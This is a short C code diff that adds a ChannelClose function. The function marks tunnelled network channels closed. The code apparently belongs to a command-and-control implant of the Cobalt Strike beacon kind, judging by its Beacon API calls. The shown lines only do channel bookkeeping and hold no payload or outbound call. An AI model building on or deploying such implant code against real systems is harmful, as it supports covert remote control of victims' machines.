@@ -194,3 +194,20 @@ void ChannelConnect(char* buffer, int length)
 	closesocket(sock);
 	BeaconOutput(CALLBACK_CLOSE, buffer, sizeof(channelId));
 }
+
+void ChannelClose(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int channelId = BeaconDataInt(&parser);
+
+	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
+	{
+		if(channel->state != CHANNEL_STATE_0 && 
+			channel->id == channelId &&
+			channel->type != CHANNEL_TYPE_BIND)
+		{
+			channel->state = CHANNEL_STATE_0;
+		}
+	}
+}
